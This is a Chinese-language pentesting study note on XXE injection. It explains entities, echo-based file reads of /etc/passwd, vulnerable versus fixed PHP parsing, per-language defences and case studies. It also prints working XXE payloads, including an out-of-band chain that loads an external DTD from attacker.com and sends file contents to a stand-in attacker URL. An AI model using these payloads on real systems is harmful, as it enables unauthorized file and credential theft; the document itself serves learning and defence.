## 1. XXE 核心原理与有回显利用（文件读取）🔴 核心 —— 必须吃透，动手复现

### 1.1 它是什么

XXE 是指：当程序解析用户提交的 XML 时，XML 解析器被允许去解析 `<!DOCTYPE>` 里声明的"外部实体"（external entity），而外部实体的地址是攻击者可控的，于是攻击者能让服务器替自己去读本地文件（任意文件读取）、访问内网地址（相当于 SSRF）。

> 类比：XML 文档里的"实体"有点像 Word 文档里的"自动替换文字"——你定义一个缩写，Word 看到就自动展开成完整内容。正常情况下这个"完整内容"是你自己写死的一段文字；但 XXE 里，这段"要展开成什么"被设计成**可以指向一个外部地址**（比如一个文件路径、一个 URL），而且解析器会老老实实跑去把那个地址的内容抓回来替换进文档。攻击者要做的，就是把这个地址改成 `file:///etc/passwd` 这种本不该被信任的地址。

一句话压缩版：**你让服务器解析一段 XML，它会顺手把这段 XML 里"指向的地址"也取一遍——而这段 XML 是你写的。**

### 1.2 实体到底是什么：DTD 声明与四种实体

在讲"为什么会存在"之前，先搞清楚两个会一直出现的词：**DTD** 和**实体**。

**DTD（Document Type Definition，文档类型定义）** 是写在 `<!DOCTYPE ...>` 里的一段声明，作用是"预先登记这篇文档里会用到哪些实体、分别代表什么"。

**实体（entity）** 就是一个**可以被引用的占位符**：先定义好它叫什么、代表什么内容，正文里用 `&名字;` 引用时，解析器就把引用替换成定义好的内容。

```xml
<!DOCTYPE test [
  <!ENTITY a "固定字符串">                        <!-- 内部实体：值是写死的文字 -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">        <!-- 外部实体：值是一个地址，解析器会真的去取 -->
  <!ENTITY % p "只在 DTD 内部能引用">               <!-- 参数实体：带 % 号，只能在 DTD 里用，不能在正文里用 -->
]>
```

| 类型 | 声明写法 | 引用写法 | 值是什么 |
|---|---|---|---|
| 内部实体 | `<!ENTITY a "文字">` | `&a;` | 开发者写死的固定文字 |
| 外部实体 | `<!ENTITY a SYSTEM "地址">` | `&a;` | **解析器去这个地址取回来的内容**——可以是本地文件，也可以是一个 URL |
| 参数实体 | `<!ENTITY % a "...">` | `%a;` | 只能在 DTD 内部引用，正文里不能用 |

**为什么必须"先声明、后引用"**：解析器读 XML 是**从上到下顺序扫描**的，碰到正文里的 `&xxe;` 时要去查"这个名字对应什么内容"，这张对照表就是靠前面的 DTD 声明建立起来的。没有声明就直接引用，解析器查不到，会直接报 "entity not defined" 导致解析失败。打个比方：这跟合同开头先写"以下简称'甲方'指某某公司"，正文才能用"甲方"二字是一个道理——没有这句开头声明，正文直接冒出"甲方"没人知道指谁。

XXE 能读文件，根子就在**外部实体**这一种声明方式上：它的值不是开发者写死的常量，而是**由 `SYSTEM` 后面的地址决定，解析器会真的去访问**。攻击者能控制这段 XML，就等于能控制这个地址指向哪里。

### 1.3 为什么会存在（原理）

**正常流程**：XML 规范允许在 DTD（文档类型定义）里声明实体（`<!ENTITY 名字 "内容">`），文档正文里用 `&名字;` 引用时，解析器就把它替换成声明的内容，这本来是用来做"文档内部复用"的——比如一份合同里重复出现的公司全称，定义一次实体，后面都用缩写引用。

**开发者在哪里做了什么假设**：XML 规范还允许实体的"内容"不写死在文档里，而是写成 `SYSTEM "地址"`，意思是"这段内容请解析器自己去这个地址取"。很多开发者在接入 XML 解析库时，默认信任了一个假设——**"反正是我自己系统内部用的 XML 格式，不会有恶意内容"**——却忘了这段 XML 的**原始文本内容**（包括 DOCTYPE 声明）本身是用户可控的。换句话说，开发者信任的是"数据格式合法",却没意识到"格式合法的数据里,还夹带着一条指令——去帮我访问这个地址"。

**攻击者如何打破假设**：攻击者在提交的 XML 里自己加一段 `<!DOCTYPE>`，声明一个指向 `file:///etc/passwd` 或内网地址的外部实体，再在正文里引用它。只要解析器没有被显式配置为"禁止解析外部实体"，它就会乖乖去把这个地址的内容读回来，塞进返回给用户的数据里，或者至少真的发出了那个请求。

**因此产生的直接后果**：任意文件读取、服务端发起的请求（等价于 SSRF）。注意这里只写"读文件 / 发请求"，没有直接写"命令执行"——1.4 节会专门纠正"XXE=RCE"这个常见但不准确的说法。

> [!note] 🔎 补充（非原笔记内容）
> XML 规范还有一条容易被忽略的限制：**参数实体（以 `%` 开头）不能出现在内部 DTD 子集的标记声明内部**。也就是说，下面这种"直接在本地 DOCTYPE 里把读到的内容拼进另一个实体值里发出去"的写法，在内联场景下是**非法的、会解析失败**的：
> ```xml
> <!ENTITY % file SYSTEM "file:///etc/passwd">
> <!ENTITY send SYSTEM "http://attacker/?d=%file;">   <!-- ❌ 参数实体被用在了实体值里，不合法 -->
> ```
> 这条限制只在**内部**子集里成立，**外部 DTD**里不受这条限制约束。这正是第 2 节 Blind XXE 为什么要绕一层"外部 DTD 文件"的规范依据——提前记住这条，看到三段式 payload 就不会觉得莫名其妙。

用户提交的原始笔记里给出的最小读取 payload，结构正好对应这条链路：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

`<!DOCTYPE test [...]>` 是攻击者加进去的"指令"；`SYSTEM "file:///etc/passwd"` 是"去哪取"；`&xxe;` 是"在哪替换"；这三者凑在一起，就是整条利用链。

**代码层面长什么样**

```php
<?php
// ❌ 有问题的写法
// source（用户输入从哪进来）：$_POST['xml_data'] 是客户端直接提交的原始 XML 文本，
//      攻击者可以在里面塞任意 DOCTYPE/ENTITY 声明。
// sink（危险操作在哪）：simplexml_load_string() 这类解析函数本身——
//      只要调用时允许 DTD 加载（默认传入了 LIBXML_DTDLOAD/LIBXML_NOENT 等标志，
//      或用的是老版本 libxml < 2.9.0），外部实体就会被解析执行。
$xml = simplexml_load_string($_POST['xml_data'], 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
echo $xml->productId; // 外部实体的内容会原样出现在这里，形成"有回显"的 XXE
```

```php
<?php
// ✅ 修复后的写法
// 关键不是调用某个"禁用"函数，而是从源头上不要打开会触发外部实体/DTD 解析的标志位。
$dom = new DOMDocument();
$dom->loadXML($_POST['xml_data']); // 不传 LIBXML_NOENT / LIBXML_DTDLOAD / LIBXML_DTDVALID，
                                    // 不会解析外部实体，这是最直接有效的修复
echo $dom->getElementsByTagName('productId')->item(0)->nodeValue;
```

> [!note] 🔎 补充（非原笔记内容）
> 原笔记给出的 PHP 修复方式是 `libxml_disable_entity_loader(true)`。这条在 **PHP 8.0 起已被标记为 deprecated**：因为 PHP 7.0 之后捆绑的 libxml 版本号 ≥ 2.9.0，libxml 自身已经**默认关闭外部实体替换**，这条函数变得没有意义，继续调用它甚至可能影响 `SoapClient` 之类功能。真正的风险点变成了：开发者显式传入 `LIBXML_NOENT`、`LIBXML_DTDLOAD` 或 `LIBXML_DTDVALID` 这几个标志时，外部实体解析会被重新打开。所以审计 PHP 代码时，**该找的不是"有没有调用禁用函数"，而是"有没有在加载 XML 时传了这几个标志位"**。（来源：PHP 官方手册 `libxml_disable_entity_loader` 页面，英文原文，2026-11 查阅）

代码审计时看到"XML 解析函数 + 用户可控的原始 XML 文本 + 显式打开了 DTD/实体加载相关标志"这个组合，就该警觉。

### 1.4 常见危害辨析：XXE 不等于 RCE

课程和一些资料里常笼统写"XXE 可造成命令执行"，这个说法不够准确，容易让报告写得含糊。实际危害按下表拆开看：

| 危害 | 机制 | 频度 |
|---|---|---|
| 任意文件读取 | 外部实体取 `file://` | 高，最常见、最稳 |
| SSRF / 打内网 / 打云元数据 | 外部实体取 `http://内网地址`，服务端替你发请求 | 高 |
| 拒绝服务（Billion Laughs） | 实体嵌套自引用，指数级膨胀 | 低，现代解析器多有保护上限，⚪ 扫过即可 |
| 命令执行 | **XXE 本身不直接提供命令执行能力**；要么目标环境启用了罕见的扩展（如 PHP 的 `expect://`），要么是"读到配置文件里的凭据 → 用凭据打另一个漏洞 → 拿到命令执行"这种**组合链**（1.6 节的 Zimbra 案例就是典型） | 低，且基本都是组合链而非 XXE 单独达成 |

**对报告的意义**：把"能读到什么"写清楚（哪个文件、哪个字段），比笼统写"存在 XXE，可能导致 RCE"更有说服力，也更符合实际——命令执行往往不是 XXE 这一个漏洞单独做到的。

### 1.5 怎么做（过程，黑盒判定）

**步骤 1：找到接收 XML 的输入点**
- 做什么：观察请求的 `Content-Type` 是否为 `application/xml` / `text/xml`，或者接口虽然声明别的类型，但 body 本身就是 XML 格式。
- 为什么这么做：XXE 的前提是服务端会把你的输入当 XML 解析，找不到这个输入点，后面无从谈起。
- 做完得到什么：确认了一个候选输入点；如果接口明明传了 JSON/表单却照样接受你改成 XML 格式提交，说明它底层可能复用了同一个 XML 解析逻辑，也值得测。

**步骤 2：探测是否存在外部实体解析**
- 做什么：在原始请求的 XML 上加一段指向无害本地文件（如 `/etc/hostname` 或 Windows 的 `C:/Windows/win.ini`）的 DOCTYPE/ENTITY 声明，替换掉某个会被回显的字段。
- 为什么这么做：先用一个**低风险、好确认**的文件验证"外部实体到底有没有被解析"，而不是一上来就读敏感文件——这是在验证假设，不是在造成破坏。
- 做完得到什么：如果响应里出现了文件内容，说明存在有回显的 XXE，可以直接进第 3 步升级；如果响应没变化、报错，或者请求直接超时挂起，不代表没有漏洞，要怀疑是 Blind XXE，转第 2 节。
- 如果不是预期结果：检查 payload 语法是否被转义、字段是否真的被解析器处理（有些字段是纯文本，不会经过 XML 解析器），再换一个输入点试。

**步骤 3：升级为任意文件读取 / SSRF**
- 做什么：把 `SYSTEM` 后面的地址换成目标文件路径，或者换成内网地址（如云环境的元数据服务地址）。
- 为什么这么做：从"证明漏洞存在"走到"证明漏洞的实际影响"，这是写报告、评级别时必须要有的证据。
- 做完得到什么：读到目标文件内容，或确认服务端确实向你指定的内网地址发出了请求（可以用 DNS/HTTP 带外服务器观察有没有被访问）。

payload 拆解：

| 片段 | 作用 | 为什么需要 |
|---|---|---|
| `<!DOCTYPE test [ ... ]>` | 声明内部 DTD，这是能定义实体的前提 | XML 规范要求实体必须先在 DTD 里声明才能被引用 |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | 声明一个名为 `xxe` 的外部实体，内容来自本地文件 | `SYSTEM` 告诉解析器"去这个地址取内容"，`file://` 协议头指向本地文件系统 |
| `&xxe;` | 在正文里引用该实体 | 解析器碰到这个引用就会用上面取到的内容替换掉它，形成回显 |

正常输出怎么读：如果返回体里 `productId` 字段的位置出现了 `root:x:0:0:root:/root:/bin/bash` 这样的 `/etc/passwd` 格式内容，说明文件被成功读取；如果出现 XML 解析报错（如 "DOCTYPE is disallowed"），说明解析器已经做了防护。

### 1.6 业务里长什么样（案例锚点）

**案例一（文件读取 + 疑似可升级）**：2012 年，巴西安全研究员 Reginaldo Silva 在 Drupal 处理 OpenID 登录的组件里发现了一个 XXE（XML External Entity Expansion）漏洞。2013 年他注意到 Facebook 的"忘记密码"功能里，`facebook.com/openid/receiver.php` 同样使用 OpenID 协议处理第三方返回的 XML 响应，于是怀疑 Facebook 也存在同样的问题，经过反复调试后验证成功。2014 年 1 月，Facebook 公开确认该漏洞，并将其认定为可升级至远程代码执行（RCE）级别，支付了当时 Facebook 漏洞赏金计划史上最高的一笔奖金——33,500 美元。

- 根因对应本笔记哪一环：Facebook 的 OpenID 接收端需要解析第三方 OpenID Provider 返回的 XML 响应，而解析器没有禁止外部实体解析——对应 1.3 节讲的"信任了数据格式合法，却没意识到格式合法的数据里夹带了指令"。
- 业务后果：攻击者可以读取 Facebook 生产服务器上的任意文件；研究员进一步论证了该漏洞具备升级为远程代码执行的可能性（但该升级路径本身未经实际验证，Facebook 修复后研究员只是"写邮件说明了思路"）。
- 渗透测试者的启发：一个"第三方登录/联合认证"这类看似与"文件上传"毫无关系的功能点，只要背后涉及 XML 解析，照样值得测 XXE；同一类漏洞（Drupal 的 OpenID 模块）可能被复用在多个不同产品里，审计一个开源组件时发现的问题，要联想到所有使用了这个组件的下游系统。

（来源：Malwarebytes、Threatpost、SecurityWeek 等英文媒体对 2014 年 Facebook 官方披露的报道，细节以 Reginaldo Silva 本人博客与上述报道为准，具体技术细节未逐字核实，赏金金额与时间线多方报道一致）

> **CVE-2019-9670（Zimbra Collaboration Suite XXE）**：2019 年披露，影响 Zimbra 8.7.x 到 8.7.11p9，漏洞点在 `mailboxd` 组件的 `/Autodiscover/Autodiscover.xml` 接口，无需登录即可触发。攻击者提交一段带外部实体的 Autodiscover 请求，读取 `/opt/zimbra/conf/localconfig.xml`，这个配置文件里存有 `zimbra` 账号的 LDAP 口令；拿到口令后，再配合另一个 SSRF 漏洞（CVE-2019-9621）打到管理端口，换取管理员 cookie，最终上传 WebShell 完成命令执行。
> - 根因对应本笔记哪一环：和案例一完全一样的机制——外部实体 `SYSTEM "file://..."` 被解析器忠实执行；对应 1.2/1.3 节的原理。
> - 业务后果：邮件系统（账号、邮件、通讯录）被完全接管。
> - 渗透测试者的启发：这正好是 1.4 节说的"组合链"实例——**XXE 这一步只负责"读到凭据"**，命令执行是后面另一个 SSRF 漏洞做到的；读 `localconfig.xml` 这类配置文件，比读 `/etc/passwd` 价值高一个数量级，报告里把"读到了什么凭据、这个凭据能干什么"写清楚，比笼统写"存在 XXE 可致 RCE"更站得住。
>（来源：SANS Internet Storm Center 漏洞分析日志、NVD 的 CVE-2019-9670 条目、Positive Technologies 安全公告数据库，均为非中国大陆来源，2026-11 核实）

### 1.7 实战怎么用

- **什么时候该想到它**：看到 `Content-Type: application/xml` 或 `text/xml`；看到接口名字里带 `import`、`export`、`upload`、`sync`；看到 SOAP/RPC 风格接口；看到文件上传接受 `.xml`、`.svg`、`.docx`、`.xlsx` 等基于 XML 的格式；看到 RSS/Atom 订阅处理功能。
- **怎么验证**：优先用读取一个无害的本地文件（如 `/etc/hostname`）来验证，而不是直接上来就读 `/etc/shadow` 这类高敏感文件；云环境里优先读元数据服务返回的非凭据类信息，确认链路通了再决定要不要进一步验证凭据读取（且需要提前确认授权范围允许）。
- **怎么判断结果**：响应里出现了文件内容/明显的系统信息，算成立；响应无变化但也没报 XML 语法错误，要怀疑是 Blind XXE，别轻易下"不存在"的结论。
- **下一步**：确认文件读取后，可以尝试读取配置文件（数据库连接串、密钥）、读取 Web 应用源码进一步代码审计；确认 SSRF 后，继续探测内网存活主机和云元数据接口。
- **怎么证明影响**：报告里给出"能读到哪个具体文件的哪一部分内容"作为最小无破坏证据（比如 `/etc/hostname` 的主机名、某个配置文件里脱敏后的字段名），而不是整个 dump 敏感文件；SSRF 类则证明"确实向我指定的内网/元数据地址发出了请求"（带外服务器的访问日志）即可，不需要真的拿到凭据再去使用它。

### 1.8 防御与检测视角

开发者通常的修复方式是在解析 XML 时**不开启**外部实体/DTD 相关的解析选项（而不是额外调用某个"禁用"函数，参见 1.3 节补充）；或者在应用层过滤用户提交内容里的 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 等关键词。过滤关键词这种方案容易被绕过（比如大小写、编码、XInclude 等变体，见第 4 节），本质修复还是要落在"解析器配置层面默认不解析外部实体"。

各语言具体怎么关，按语言给一份可核对的清单：

| 语言 / 库 | 正确做法 | 容易写错的点 |
|---|---|---|
| PHP（DOMDocument / SimpleXML） | 不传 `LIBXML_NOENT`、`LIBXML_DTDLOAD`、`LIBXML_DTDVALID` 这几个标志（见 1.3 节补充） | 以为调用 `libxml_disable_entity_loader(true)` 就万事大吉——这条在 PHP 8 已弃用，真正风险点是显式传的标志位 |
| Java（`DocumentBuilderFactory`） | 设置 `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，这是**真正关闭 DTD 解析**的开关 | 只调用 `setExpandEntityReferences(false)` 不够——这个只影响实体展开方式，不能阻止外部 DTD 本身被加载和访问 |
| Python（`lxml`） | `etree.XMLParser(resolve_entities=False, no_network=True)` | 只写 `resolve_entities=False` 而漏了 `no_network=True`，部分场景下外部 DTD 仍可能被请求；更省心的方式是直接用 `defusedxml` 库替换标准库的 `xml.etree` |
| .NET（`XmlDocument` / `XmlReader`） | 显式设置 `XmlResolver = null`（或 `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`） | 不设置 `XmlResolver` 就等于留着默认的 `XmlUrlResolver`，外部实体照样会被解析 |
| Node.js（`libxmljs` / `xml2js`） | 确认所用库默认是否解析外部实体，必要时显式关闭 `noent`/`dtdload` 相关选项 | 很多 Node XML 库文档对这块语焉不详，建议用已知安全的库（如 `fast-xml-parser`，默认不处理 DTD）替代 |

### 1.9 白盒审计：去哪找危险解析函数

拿到源码时，没必要通读整个项目，搜以下几类函数/关键词，定位到调用点之后再判断有没有做防护：

- PHP：`simplexml_load_string`、`simplexml_load_file`、`DOMDocument->loadXML`、`DOMDocument->load`、`SoapClient` 的相关调用
- Java：`DocumentBuilderFactory`、`SAXParserFactory`、`XMLInputFactory`（JAXP 系列）、以及任何手写的 `javax.xml.parsers` 用法
- Python：`xml.etree.ElementTree`、`lxml.etree`、`xml.dom.minidom`、`xml.sax`
- .NET：`XmlDocument`、`XmlReader`、`XPathDocument`
- 通用线索：代码里出现 `DTDLOAD`、`resolve_entities`、`setFeature`、`XmlResolver`、`disallow-doctype-decl` 这类关键词，说明开发者至少**考虑过**这个问题，重点看配置的值和方向对不对，而不是有没有出现这几个词。

### 1.10 易错点

- 误区：以为响应里没有任何异常就代表没有 XXE。实际上很多场景是 Blind XXE，必须用带外手段才能确认，见第 2 节。
- 排错线索：如果请求发出去后服务端长时间不返回、最后超时，很可能是解析器真的去尝试访问了你指定的地址（比如 `file:///dev/random` 这种会无限读的设备文件），这本身就是"外部实体被解析"的证据，只是没有直接回显内容。

## 2. Blind XXE / OOB（带外利用）🔴 核心 —— 必须吃透，动手复现

### 2.1 它是什么

当目标存在外部实体解析，但响应里**看不到**读取的内容时（没有合适的回显点，或者直接报错导致正文为空），就需要用"带外"（Out-of-Band，简称 OOB）的方式——让服务端主动把读到的内容，通过它自己发起的网络请求，"送"到攻击者控制的服务器上。

> 类比：有回显的 XXE 像是你问快递员"包裹里是什么",他当面念给你听；Blind XXE 则是快递员不会当面告诉你,但你可以让他"按包裹内容拼一个网址,自己去访问一下"——你在自己的网站后台看访问日志,照样能拼出包裹里写的是什么。

### 2.2 为什么需要"外部引用实体 DTD"这一层

规范依据见 1.3 节补充框：参数实体不能出现在**内部**子集的标记声明内部，但**外部 DTD** 不受这条限制。所以想把"读到的文件内容拼进一个 URL 发出去"这个动作做出来，必须借助一个外部 DTD 文件作中转：本地 XML 只负责"去加载这个外部 DTD 文件"，真正的拼接动作写在外部 DTD 文件里完成。

原始笔记给出的三段式链路，对应关系是：

1. 本地 XML 里的 `<!ENTITY % file SYSTEM "http://attacker.com/evil.dtd"> %file;` —— 去加载攻击者的外部 DTD。
2. `evil.dtd` 里的 `<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/get.php?file=%file;'>">` —— 在外部 DTD 这一层，把"已经读到的本地文件内容"拼进另一个 URL 里。
3. 攻击者服务器上的 `get.php` 接收这个请求，把 `file` 参数（也就是被读取文件的内容）落盘，完成带外回传。

### 2.3 怎么做（过程）

**步骤 1：准备带外接收端**
- 做什么：搭建一个可公网访问的 HTTP 服务（或用 DNSLog 平台），用来接收目标服务器发起的请求。
- 为什么这么做：Blind XXE 的证据就是"目标服务器主动访问了我控制的地址"，没有接收端就拿不到证据。
- 做完得到什么：一个能记录访问日志、能看到请求参数的地址。

**步骤 2：提交指向外部 DTD 的 payload**
- 做什么：按 2.2 节的链路构造请求，`SYSTEM` 地址指向你搭建的外部 DTD 文件。
- 为什么这么做：验证目标是否会去加载外部 DTD——这是整条利用链能不能走通的第一个关卡。
- 做完得到什么：如果接收端日志出现了对 `evil.dtd` 的请求，说明外部 DTD 加载成功，可以继续走后半段拼接文件内容的流程；如果没有任何请求，说明目标可能禁止了外部 DTD 加载，或网络不通（内网隔离），要换思路（比如看目标服务器能不能访问公网）。

**步骤 3：确认文件内容带外回传**
- 做什么：等待/触发目标重新请求，观察接收端是否收到带着文件内容的 `get.php?file=...` 请求。
- 为什么这么做：这一步才是真正拿到"读取结果"，前两步只是验证链路通不通。
- 做完得到什么：在接收端日志里看到 URL 编码过的文件内容，证明任意文件读取成立且已经绕过了"无回显"的限制。
- 如果不是预期结果：常见原因是文件内容里包含了 URL 里的保留字符（如换行符）导致请求被截断，或者目标对出站请求做了白名单限制；可以换用"错误解析报错渗出"这种变体（故意让文件路径拼接出一个不存在的路径，报错信息里会带出部分内容）。

### 2.4 实战怎么用（用到时去哪查）

- 什么时候该想到它：第 1 节的探测步骤里，响应没有变化、也没有报错，但请求有明显延迟或挂起。
- 用到时去哪查：带外测试平台（公开的 DNSLog/HTTP 带外收集服务，靶场环境下可以自建）、各类 XXE payload 速查表（PortSwigger Web Security Academy 的 XXE 专题有完整的交互式练习和 payload 列表，建议直接在上面练手而不是死记payload）。

## 3. 配合云环境 SSRF 读取元数据凭据 🟡 重要 —— 懂原理，用到会查

**是什么**：如果存在 XXE 的目标部署在云服务器上（AWS/阿里云等），把外部实体的 `SYSTEM` 地址指向云平台的元数据服务地址（如 AWS 的 `169.254.169.254`），就可能读取到该云主机绑定的临时安全凭据。

**为什么值得单独拎出来**：普通 XXE 的 SSRF 效果，往往只能探测内网端口开没开；但云环境的元数据服务是一个**固定、几乎必定存在**的内网地址，一旦打通，拿到的是可以直接调用云 API 的临时凭据，危害从"内网探测"直接跳到"云账号层面的权限"。2019 年 Capital One 的数据泄露事件就是经由 SSRF 访问云元数据服务获取凭据导致的（虽然该事件的入口手法与 XXE 不完全相同，但危害链路——"SSRF→元数据服务→临时凭据→横向访问云资源"——是同一类问题，值得作为理解这一节危害程度的参照）。

**用到时去哪查**：具体元数据服务的路径格式因云厂商而异（AWS/阿里云/腾讯云各不相同），实战遇到时现查对应云厂商的官方文档确认当前路径格式和返回结构即可，不需要背。

## 4. XInclude 攻击 🟢 了解 —— 读一遍，存着备查

一些应用不会把用户提交的完整 XML 直接拿去解析，而是把用户提交的**一段数据**，在服务端拼接嵌入到另一份完整的 XML 文档里再解析。这种场景下，用户数据所在的位置可能不允许你自己写 `<!DOCTYPE>`（因为 DOCTYPE 必须在文档最前面，而你的数据只是文档中间的一段），但如果服务端开启了 XInclude 支持，依然可以用 XInclude 语法去读取本地文件：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**可迁移的思路**：这提醒你——"用户数据只是整份 XML 文档的一小段，不能自己定义 DOCTYPE"不等于"没有 XXE 风险"，遇到"服务端拼接用户数据到 XML 里"这种架构时，要想到 XInclude 这条路。
**细节备查**：具体语法和更多变体，用到时查 PortSwigger 或 OWASP 的 XXE 专题文档即可。

## 5. SVG / DOCX 等文件格式里的 XXE 🟢 了解 —— 读一遍，存着备查

DOCX、XLSX 这类 Office 文档本质上是 ZIP 包里套着若干 XML 文件；SVG 本身就是 XML 格式的矢量图。只要应用会**解析**这些文件内容（比如生成缩略图、提取文字、在服务端渲染预览），而不是单纯存储转发，这个解析动作背后往往也是一个 XML 解析器，同样可能存在 XXE。

**可迁移的思路**：看到"文件上传"功能，除了想到传统的 Web Shell、文件类型绕过，还要想一下"这个文件上传之后，服务端会不会去解析它的内容"——会解析，且格式基于 XML（docx/xlsx/svg/以及各类基于 XML 的配置文件格式），就值得构造带 XXE payload 的文件去测。
**细节备查**：具体往 SVG/DOCX 里塞 payload 的格式模板，用到时查对应格式的 XXE 测试案例即可，不需要事先记完整文件结构。

## 6. 把它串起来：方法论总览

```
发现接收 XML 的输入点（含文件上传里基于 XML 的格式）
        │
        ▼
提交无害探测 payload（读无害本地文件）
        │
   ┌────┴────┐
有回显/有延迟       无变化也无报错
   │                │
   ▼                ▼
直接按 1.5 节升级    怀疑 Blind XXE → 走第 2 节带外链路
为文件读取/SSRF            │
   │                       ▼
   │                确认外部 DTD 能否被加载
   │                       │
   │                 能 → 拼接文件内容带外回传
   │                 不能 → 换关键词过滤绕过思路，或判定不存在
   ▼                       │
升级：云环境查元数据（第3节）/   ◄───┘
      探索 XInclude、文件格式变体（第4、5节）
   │
   ▼
用最小证据证明影响，写进报告
```

每个分叉点的判断依据：响应里**是否出现了预期文件内容** → 决定走有回显分支还是 Blind 分支；**外部 DTD 请求有没有被目标服务器真实发出** → 决定 Blind 链路能不能走通，还是要换绕过思路。

## 7. 自测（先自己想，再看答案）

1. 用自己的话说一说：为什么"文档格式合法"不等于"文档内容可信"？这跟 XXE 的根因有什么关系？
2. 场景题：某电商后台的"批量导入商品"功能接受上传一个 XML 文件，解析后批量写数据库，没有任何回显字段会把文件内容展示出来。你会怎么入手判断它是否存在 XXE？
3. 排错题：你提交了一个指向 `file:///etc/passwd` 的 payload，响应里没有任何内容变化，也没有报错，接口正常走完了业务逻辑。可能是哪几个原因？
4. 辨析题：甲说"这个接口存在 XXE，我已经可以命令执行了"，但他给出的证据只是"成功读到了 `/etc/passwd`"。这个结论站得住吗？该怎么补证据/怎么表述更准确？

<details>
<summary>参考答案</summary>

1. XML 规范本身允许"内容来自外部地址"这种声明方式，这是格式层面合法的语法；但"去哪个地址取"这个值是提交者自己写的，格式合法不代表这个地址是善意的。XXE 的根因就是解析器只检查了"语法对不对"，没有检查"这条指令该不该被信任"。
2. 这正是第 2 节的典型场景——没有回显点。应该先用带外（Blind XXE）手段验证：构造指向外部 DTD 的 payload，看自己搭建的接收端有没有收到目标服务器发来的请求；如果收到了，再走拼接文件内容回传那一步。
3. 可能原因：① 解析器本身禁止了外部实体/DTD 解析（libxml ≥ 2.9.0 默认如此，除非代码显式打开相关标志）；② 接口确实不是走 XML 解析器处理这段数据；③ 存在漏洞但属于 Blind XXE，只是这次测试没有产生可观察的副作用（比如目标服务器出网被完全禁止，带外请求根本发不出去）；④ payload 语法本身有误（比如引号未转义），导致解析直接失败并被框架悄悄吞掉了异常。
4. 不站得住，见 1.4 节：读到 `/etc/passwd` 只证明了"任意文件读取"，没有证明命令执行。要么找到目标环境确实启用了 `expect://` 这类罕见扩展并实际验证了命令执行，要么找到"读到的内容能拿去打另一个漏洞（如配置文件里的凭据、密钥）"这条组合链并把链路走通（参考 1.6 节 Zimbra 案例）。表述上应该写成"存在任意文件读取（XXE），已验证读取到 XX 文件；是否可进一步升级为命令执行需要 XX 条件，当前未验证"，而不是直接断言"已命令执行"。

</details>

- CVE-2019-9670 的三段式利用链（XXE 读配置 → 配合 CVE-2019-9621 SSRF → 管理员 cookie → WebShell）综合了 SANS ISC 分析日志和一份西语安全通告的描述，两者对"是否必须依赖第二个 SSRF 漏洞才能最终 RCE"的表述略有出入，具体是否所有受影响版本都需要这一步，建议查 Zimbra 官方补丁说明核实。
- `libxml_disable_entity_loader` 在 PHP 8 中被弃用这一结论来自 PHP 官方手册，是否影响你当前使用的具体框架（如某些老版本的 SOAP 客户端）需要结合自己的运行环境版本实测确认，未在本机环境验证。
- Java `disallow-doctype-decl` feature、.NET `XmlResolver = null`、Python `defusedxml` 这几条修复建议是业内公认的标准做法，但未在本篇逐一实测，建议落地前按自己的框架版本核对一次官方文档。
- 原笔记中"过滤关键词 `<!DOCTYPE` 和 `<!ENTITY`"这类应用层方案在正文中提及但未展开讨论其可被绕过的具体手法（大小写混淆、编码、XInclude 规避过滤等），建议后续结合 PortSwigger 的 XXE 实验专项补充这部分黑盒绕过技巧。
